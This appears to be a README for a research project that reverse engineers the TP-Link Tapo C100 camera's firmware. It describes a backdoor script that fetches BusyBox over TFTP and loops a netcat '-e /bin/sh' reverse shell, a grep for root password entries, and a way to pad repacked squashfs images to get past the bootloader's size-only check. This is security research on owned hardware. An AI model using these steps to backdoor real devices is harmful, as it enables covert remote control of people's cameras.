# Tapo C100 reverse engineering

## Introduction

> The TP-Link Tapo C100 is a consumer-grade IP camera widely deployed in home and small-office
> environments. It provides features such as live video streaming, motion detection, infrared
> night vision, and tight integration with the Tapo mobile ecosystem.
>
> This project focuses on reverse engineering the Tapo C100 with the specific objective of
> achieving an interactive reverse shell on both the factory-installed firmware and the latest
> officially released firmware. Gaining shell access enables deeper inspection of the device’s
> runtime environment, including process behavior, filesystem layout, startup scripts, and security
> controls enforced by the vendor.
>
> By comparing the attack surface and protections present in the factory firmware against those
> introduced in newer firmware versions, this research aims to analyze how the device’s security
> model has evolved over time. This includes examining mitigation techniques, hardening measures,
> and changes in exposed services or interfaces.
>
> [!NOTE]
> **All activities described in this project are conducted for educational and security research purposes
> on owned hardware. The findings are intended to contribute to a better understanding of consumer IoT
> device security, support vulnerability research, and promote transparency and informed risk assessment
> in smart home deployments.**

## How to obtain passwd and shadow files?

> After extracting the firmware with `binwalk`, search the extracted
> filesystem for password entries by looking for lines that start with
> `root:`.

```console
~ grep -ar "^root:" <path-to-extraction-dir>
```

## Backdoor script

> This shell script waits for network connectivity, downloads a BusyBox
> binary via TFTP, and repeatedly attempts to establish a reverse shell
> connection to a remote host.

### Step-by-step behavior

1. **Waits for internet access**

   > The script continuously pings `google.com` until a response is received,
   > indicating that network connectivity is available.

2. **Downloads payload**

   > Once the network is up, the script changes to the `/tmp` directory and
   > downloads a MIPS little-endian BusyBox binary from a TFTP server.

   ```sh
   tftp -g <ip-address> -r busybox-mipsel
   ```

3. **Makes the binary executable**

   > The downloaded file is marked as executable so it can be run.

   ```sh
   chmod +x busybox-mipsel
   ```

4. **Establishes a reverse shell**

   > The script enters an infinite loop and repeatedly attempts to connect
   > back to a remote host using netcat, spawning a shell on successful
   > connection.

   ```sh
   ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
   ```

## Make squashfs filesystem

> Display filesystem superblock information

```console
~ unsquashfs -s <old-squashfs>
```

> Make squashfs with backdoor.sh script

```console
~ mksquashfs <unsquashed-filesystem> <new-squashfs> -comp <compression> -b <block size>
```

## Make image

```console
~ mkimage -A <arch> -O <os> -T <type> -C <compresion> -a <addr> -e <entry> -n <name> -d <input> <output>
```

## Merge uimage part with modified squashfs

```console
~ dd if=<uimage_part> of=<final_image> bs=1 count=<number-of-bytes>
~ dd if=<squashfs_part> of=<final_image> bs=1 seek=$((<hex-address>))
```

## SquashFS validation by size

> The bootloader validates the SquashFS (rootfs) partition **by size**, not by content(?).
> During firmware validation, U-Boot checks that the compressed SquashFS image
> **exactly matches the size defined in the partition table (TP header)**.
>
> Because of this, any modification to files inside the SquashFS (even a single byte)
> will usually change the final compressed image size, causing validation to fail and
> the firmware to be rejected.
>
> To work around this, an audio file was modified inside the filesystem and then recompress SquashFS
> **until the resulting image has exactly the same size as the original**.
> This preserves the expected partition size while still allowing controlled content changes.

## Image Merge Script (`mrgimg.sh`)

> This script merges a binary firmware part into an existing base
> image at a specified offset, producing a new combined output image.
> It is commonly used in firmware reconstruction workflows where
> individual partitions must be reinserted into a full flash dump.

### Usage

```console
~ ./mrgimg.sh <part-to-merge> <size> <output-img>
```

## SquashFS Size-Tuning Script

> This Bash script repeatedly rebuilds a SquashFS filesystem and
> dynamically adjusts its contents until the resulting filesystem
> matches a **target size exactly**. It is useful when repacking firmware
> images that require a SquashFS partition to have a **precise byte
> length** (e.g., fixed-offset flash layouts).
>
> The script runs in a loop, incrementally adding or removing data from a
> file inside the filesystem until the desired size is reached.

```console
./tunesquashfs <squashfs-root-dir> <block-size> <compression> <expected-size> <squashfs-output>
```

```console
.
.
.
Nmap scan report for nobody.home (192.168.1.57)
Host is up (0.000026s latency).
Nmap scan report for c100.home (192.168.1.66)
Host is up (0.011s latency).
Nmap done: 256 IP addresses (11 hosts up) scanned in 4.49 seconds
```

The last part I get on serial port
```console
[    0.577587] SLP flash nor read
[    0.580892] MTD_REDBOOT_TP_HEADER_ADDRESS:0x70000
[    0.591274] decrypt_rootfs_header done
[    0.595156] Searching for RedBoot partition table
[    0.600050] 16 RedBoot partitions found on MTD device jz_sfc
[    0.605934] Creating 16 MTD partitions on "jz_sfc":
[    0.610997] 0x000000000000-0x00000002d800 : "factory_boot"
[    0.616669] mtd: partition "factory_boot" doesn't end on an erase block -- force read-only
[    0.625720] 0x00000002d800-0x000000030000 : "factory_info"
[    0.631441] mtd: partition "factory_info" doesn't start on an erase block boundary -- force read-only
[    0.641485] 0x000000030000-0x000000040000 : "art"
[    0.646859] 0x000000040000-0x000000050000 : "config"
[    0.652517] 0x000000050000-0x000000070000 : "normal_boot"
[    0.658584] 0x000000070200-0x0000001b0000 : "kernel"
[    0.663765] mtd: partition "kernel" doesn't start on an erase block boundary -- force read-only
[    0.673249] 0x0000001b0000-0x0000003d0000 : "rootfs"
[    0.678857] 0x0000003d0000-0x000000770000 : "rootfs_data"
[    0.684987] 0x000000770000-0x0000007f0000 : "user_record"
[    0.691116] 0x0000007f0000-0x000000800000 : "verify"
[    0.696749] 0x000000070000-0x000000770000 : "firmware"
[    0.702594] 0x0000006c645f-0x000032a19590 : "uitron"
[    0.707735] mtd: partition "uitron" extends beyond the end of device "jz_sfc" -- size truncated to 0x139ba1
[    0.717852] mtd: partition "uitron" doesn't start on an erase block boundary -- force read-only
[    0.727359] 0x0000002e342e-0x0000338d76a3 : "uitron_ext"
[    0.732902] mtd: partition "uitron_ext" extends beyond the end of device "jz_sfc" -- size truncated to 0x51cbd2
[    0.743349] mtd: partition "uitron_ext" doesn't start on an erase block boundary -- force read-only
[    0.753230] 0x000000000000-0x000000800000 : "ld"
[    0.758495] 0x000000000000-0x000000800000 : "isp"
[    0.763935] 0x000000030000-0x000000800000 : "af"
[    0.769194] SPI NOR MTD LOAD OK

<-- nothing I can do, cannot enter the credentials..
```

## References

> StackSmashing IoT Security: Backdooring a smart camera by creating a malicious firmware upgrade
> - https://www.youtube.com/watch?v=hV8W4o-Mu2o

> Landon Crabtree Cracking the Hash section
> - https://notes.landon.pw/notes/embedded/TP-LINK-Tapo-C100
